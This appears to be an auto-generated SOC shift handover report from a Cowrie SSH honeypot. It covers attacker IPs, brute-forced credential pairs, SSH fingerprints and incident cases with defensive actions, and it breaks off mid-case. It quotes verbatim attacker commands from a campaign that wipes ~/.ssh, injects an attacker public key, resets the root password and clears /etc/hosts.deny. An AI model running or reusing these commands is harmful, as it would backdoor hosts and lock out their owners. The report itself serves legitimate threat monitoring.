# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-17 |
| **Generated At** | 2026-04-17T11:02:10Z |
| **Shift Time** | 11:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **167** |
| Confirmed Threats | **164** |
| False Positives Filtered | **3** (1.8%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **9** |
| High Severity Cases | **61** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **106** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **132** |
| Unique Credential Pairs | **70** |
| Unique Usernames | **32** |
| Unique Passwords | **68** |
| Successful Auth Pairs | **35** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 60 |
| `345gs5662d34` | 29 |
| `steam` | 4 |
| `admin` | 3 |
| `frappe` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 29 |
| `3245gs5662d34` | 29 |
| `123456` | 2 |
| `frappe@2026` | 2 |
| `Dev07` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 29 |
| `root` | `3245gs5662d34` | 29 |
| `frappe` | `frappe@2026` | 2 |
| `dev` | `Dev07` | 2 |
| `root` | `qwertyuiop.` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Root08` | `210.79.191.76` | 2026-04-17T09:23:12 |
| `root` | `3245gs5662d34` | `210.79.191.76` | 2026-04-17T09:23:17 |
| `root` | `Qazwsx888..` | `58.229.141.26` | 2026-04-17T09:26:28 |
| `root` | `3245gs5662d34` | `58.229.141.26` | 2026-04-17T09:26:31 |
| `root` | `Root20!` | `103.234.53.69` | 2026-04-17T09:26:43 |
| `root` | `3245gs5662d34` | `103.234.53.69` | 2026-04-17T09:26:48 |
| `root` | `qazwsx2025#$` | `103.234.53.69` | 2026-04-17T09:28:16 |
| `root` | `Mexico123` | `210.79.191.76` | 2026-04-17T09:28:22 |
| `root` | `Hr123456` | `210.79.191.76` | 2026-04-17T09:30:08 |
| `root` | `qwertyuiop.` | `58.229.141.26` | 2026-04-17T09:31:15 |
| `root` | `ccXX000` | `103.234.53.69` | 2026-04-17T09:31:28 |
| `root` | `qazwsx1234567!!` | `210.79.191.76` | 2026-04-17T09:32:02 |
| `root` | `Qazwsx0000!@` | `103.234.53.69` | 2026-04-17T09:33:05 |
| `root` | `qwertyuiop.` | `103.234.53.69` | 2026-04-17T09:34:42 |
| `root` | `ccXX000` | `58.229.141.26` | 2026-04-17T09:39:33 |
| `root` | `Qazwsx12345!` | `103.234.53.69` | 2026-04-17T09:39:45 |
| `root` | `root123456789..` | `58.229.141.26` | 2026-04-17T09:41:07 |
| `root` | `root54321!@` | `210.79.191.76` | 2026-04-17T09:42:45 |
| `root` | `Mm123456.` | `210.79.191.76` | 2026-04-17T09:44:30 |
| `root` | `ubuntu18svm` | `210.79.191.76` | 2026-04-17T09:46:20 |
| `root` | `Abcd12!` | `171.25.158.82` | 2026-04-17T10:08:04 |
| `root` | `3245gs5662d34` | `171.25.158.82` | 2026-04-17T10:08:08 |
| `root` | `1212` | `120.48.87.166` | 2026-04-17T10:08:20 |
| `root` | `123..com` | `120.48.87.166` | 2026-04-17T10:10:07 |
| `root` | `Hola1234` | `171.25.158.82` | 2026-04-17T10:10:55 |
| `root` | `A123456b` | `171.25.158.82` | 2026-04-17T10:13:40 |
| `root` | `qazwsx0#$` | `171.25.158.82` | 2026-04-17T10:15:05 |
| `root` | `ZAQ!2wsx2019@` | `171.25.158.82` | 2026-04-17T10:17:55 |
| `root` | `QWER.1234` | `171.25.158.82` | 2026-04-17T10:23:47 |
| `root` | `A123123S` | `171.25.158.82` | 2026-04-17T10:26:35 |
| `root` | `Qazwsx112233@#` | `171.25.158.82` | 2026-04-17T10:28:01 |
| `root` | `A123456LEX` | `171.25.158.82` | 2026-04-17T10:29:29 |
| `root` | `Ff123456.` | `171.25.158.82` | 2026-04-17T10:33:42 |
| `root` | `ZAQ!2wsx54321.` | `171.25.158.82` | 2026-04-17T10:35:13 |
| `root` | `A12345687` | `171.25.158.82` | 2026-04-17T10:38:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **167** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 153 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 141 | 8 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 141 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 12 | 1 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 29 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:BBNe1o4Qfx90"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.87.166`, `93.48.24.181`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `58.229.141.26`, `171.25.158.82`, `103.234.53.69`, `210.79.191.76`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **13** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |
| `AS55990` | Huawei Cloud Service data center | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS58470` | IX Peering for Mobilink and Link Direct International. | 1 | LOW |
| `AS40065` | CNSERVERS LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (61)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-00af53fc2911

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:22 |
| **Last Seen** | 2026-04-17 09:22 |
| **Session Duration** | 18s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `cat /proc/cpuinfo | grep name | wc -l, echo "root:bVH8gidVSPiD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;, cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}', free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'` |
| **Download Attempts** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1053.003 · T1057 · T1059.004 · T1083 · T1105 · T1489 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:22:37` | `cowrie.session.params` |
| `2026-04-17 09:22:37` | `cowrie.command.input` |
| `2026-04-17 09:22:37` | `cowrie.log.closed` |
| `2026-04-17 09:22:38` | `cowrie.session.params` |
| `2026-04-17 09:22:38` | `cowrie.command.input` |
| `2026-04-17 09:22:38` | `cowrie.log.closed` |
| `2026-04-17 09:22:38` | `cowrie.session.params` |
| `2026-04-17 09:22:38` | `cowrie.command.input` |
| `2026-04-17 09:22:38` | `cowrie.session.file_download` |
| `2026-04-17 09:22:38` | `cowrie.log.closed` |
| `2026-04-17 09:22:38` | `cowrie.session.params` |
| `2026-04-17 09:22:38` | `cowrie.command.input` |
| `2026-04-17 09:22:39` | `cowrie.log.closed` |
| `2026-04-17 09:22:39` | `cowrie.session.params` |
| `2026-04-17 09:22:39` | `cowrie.command.input` |
| `2026-04-17 09:22:39` | `cowrie.log.closed` |
| `2026-04-17 09:22:39` | `cowrie.session.params` |
| `2026-04-17 09:22:39` | `cowrie.command.input` |
| `2026-04-17 09:22:39` | `cowrie.command.input` |
| `2026-04-17 09:22:40` | `cowrie.log.closed` |
| `2026-04-17 09:22:40` | `cowrie.session.params` |
| `2026-04-17 09:22:40` | `cowrie.command.input` |
| `2026-04-17 09:22:40` | `cowrie.log.closed` |
| `2026-04-17 09:22:40` | `cowrie.session.params` |
| `2026-04-17 09:22:40` | `cowrie.command.input` |
| `2026-04-17 09:22:41` | `cowrie.log.closed` |
| `2026-04-17 09:22:41` | `cowrie.session.params` |
| `2026-04-17 09:22:41` | `cowrie.command.input` |
| `2026-04-17 09:22:41` | `cowrie.log.closed` |
| `2026-04-17 09:22:41` | `cowrie.session.params` |
| `2026-04-17 09:22:41` | `cowrie.command.input` |
| `2026-04-17 09:22:42` | `cowrie.log.closed` |
| `2026-04-17 09:22:42` | `cowrie.session.params` |
| `2026-04-17 09:22:42` | `cowrie.command.input` |
| `2026-04-17 09:22:42` | `cowrie.log.closed` |
| `2026-04-17 09:22:42` | `cowrie.session.params` |
| `2026-04-17 09:22:42` | `cowrie.command.input` |
| `2026-04-17 09:22:42` | `cowrie.log.closed` |
| `2026-04-17 09:22:43` | `cowrie.session.params` |
| `2026-04-17 09:22:43` | `cowrie.command.input` |
| `2026-04-17 09:22:43` | `cowrie.log.closed` |
| `2026-04-17 09:22:43` | `cowrie.session.params` |
| `2026-04-17 09:22:43` | `cowrie.command.input` |
| `2026-04-17 09:22:43` | `cowrie.log.closed` |
| `2026-04-17 09:22:44` | `cowrie.session.params` |
| `2026-04-17 09:22:44` | `cowrie.command.input` |
| `2026-04-17 09:22:44` | `cowrie.log.closed` |
| `2026-04-17 09:22:44` | `cowrie.session.params` |
| `2026-04-17 09:22:44` | `cowrie.command.input` |
| `2026-04-17 09:22:44` | `cowrie.log.closed` |
| `2026-04-17 09:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1b55e98940b

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:23 |
| **Last Seen** | 2026-04-17 09:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:23:12` | `cowrie.session.connect` |
| `2026-04-17 09:23:12` | `cowrie.client.version` |
| `2026-04-17 09:23:12` | `cowrie.client.kex` |
| `2026-04-17 09:23:12` | `cowrie.login.success` |
| `2026-04-17 09:23:13` | `cowrie.session.params` |
| `2026-04-17 09:23:13` | `cowrie.command.input` |
| `2026-04-17 09:23:13` | `cowrie.command.failed` |
| `2026-04-17 09:23:13` | `cowrie.log.closed` |
| `2026-04-17 09:23:13` | `cowrie.session.params` |
| `2026-04-17 09:23:13` | `cowrie.command.input` |
| `2026-04-17 09:23:14` | `cowrie.session.file_download` |
| `2026-04-17 09:23:14` | `cowrie.log.closed` |
| `2026-04-17 09:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-310d9c2abdaf

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:23 |
| **Last Seen** | 2026-04-17 09:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:23:16` | `cowrie.session.connect` |
| `2026-04-17 09:23:16` | `cowrie.client.version` |
| `2026-04-17 09:23:16` | `cowrie.client.kex` |
| `2026-04-17 09:23:17` | `cowrie.login.success` |
| `2026-04-17 09:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4481e4b80c1

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:26 |
| **Last Seen** | 2026-04-17 09:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:26:27` | `cowrie.session.connect` |
| `2026-04-17 09:26:27` | `cowrie.client.version` |
| `2026-04-17 09:26:27` | `cowrie.client.kex` |
| `2026-04-17 09:26:28` | `cowrie.login.success` |
| `2026-04-17 09:26:28` | `cowrie.session.params` |
| `2026-04-17 09:26:28` | `cowrie.command.input` |
| `2026-04-17 09:26:28` | `cowrie.command.failed` |
| `2026-04-17 09:26:28` | `cowrie.log.closed` |
| `2026-04-17 09:26:29` | `cowrie.session.params` |
| `2026-04-17 09:26:29` | `cowrie.command.input` |
| `2026-04-17 09:26:29` | `cowrie.session.file_download` |
| `2026-04-17 09:26:29` | `cowrie.log.closed` |
| `2026-04-17 09:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2225da886b2

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:26 |
| **Last Seen** | 2026-04-17 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:26:31` | `cowrie.session.connect` |
| `2026-04-17 09:26:31` | `cowrie.client.version` |
| `2026-04-17 09:26:31` | `cowrie.client.kex` |
| `2026-04-17 09:26:31` | `cowrie.login.success` |
| `2026-04-17 09:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa094dff8f50

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:26 |
| **Last Seen** | 2026-04-17 09:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:26:42` | `cowrie.session.connect` |
| `2026-04-17 09:26:42` | `cowrie.client.version` |
| `2026-04-17 09:26:42` | `cowrie.client.kex` |
| `2026-04-17 09:26:43` | `cowrie.login.success` |
| `2026-04-17 09:26:43` | `cowrie.session.params` |
| `2026-04-17 09:26:43` | `cowrie.command.input` |
| `2026-04-17 09:26:43` | `cowrie.command.failed` |
| `2026-04-17 09:26:44` | `cowrie.log.closed` |
| `2026-04-17 09:26:44` | `cowrie.session.params` |
| `2026-04-17 09:26:44` | `cowrie.command.input` |
| `2026-04-17 09:26:44` | `cowrie.session.file_download` |
| `2026-04-17 09:26:44` | `cowrie.log.closed` |
| `2026-04-17 09:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313850a50800

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:26 |
| **Last Seen** | 2026-04-17 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:26:47` | `cowrie.session.connect` |
| `2026-04-17 09:26:47` | `cowrie.client.version` |
| `2026-04-17 09:26:47` | `cowrie.client.kex` |
| `2026-04-17 09:26:48` | `cowrie.login.success` |
| `2026-04-17 09:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c541920339ea

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:28 |
| **Last Seen** | 2026-04-17 09:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:28:15` | `cowrie.session.connect` |
| `2026-04-17 09:28:15` | `cowrie.client.version` |
| `2026-04-17 09:28:15` | `cowrie.client.kex` |
| `2026-04-17 09:28:16` | `cowrie.login.success` |
| `2026-04-17 09:28:16` | `cowrie.session.params` |
| `2026-04-17 09:28:16` | `cowrie.command.input` |
| `2026-04-17 09:28:16` | `cowrie.command.failed` |
| `2026-04-17 09:28:17` | `cowrie.log.closed` |
| `2026-04-17 09:28:17` | `cowrie.session.params` |
| `2026-04-17 09:28:17` | `cowrie.command.input` |
| `2026-04-17 09:28:17` | `cowrie.session.file_download` |
| `2026-04-17 09:28:17` | `cowrie.log.closed` |
| `2026-04-17 09:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d6488785761

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:28 |
| **Last Seen** | 2026-04-17 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:28:20` | `cowrie.session.connect` |
| `2026-04-17 09:28:20` | `cowrie.client.version` |
| `2026-04-17 09:28:20` | `cowrie.client.kex` |
| `2026-04-17 09:28:21` | `cowrie.login.success` |
| `2026-04-17 09:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124c2fe77e35

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:28 |
| **Last Seen** | 2026-04-17 09:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:28:21` | `cowrie.session.connect` |
| `2026-04-17 09:28:21` | `cowrie.client.version` |
| `2026-04-17 09:28:21` | `cowrie.client.kex` |
| `2026-04-17 09:28:22` | `cowrie.login.success` |
| `2026-04-17 09:28:22` | `cowrie.session.params` |
| `2026-04-17 09:28:22` | `cowrie.command.input` |
| `2026-04-17 09:28:22` | `cowrie.command.failed` |
| `2026-04-17 09:28:23` | `cowrie.log.closed` |
| `2026-04-17 09:28:23` | `cowrie.session.params` |
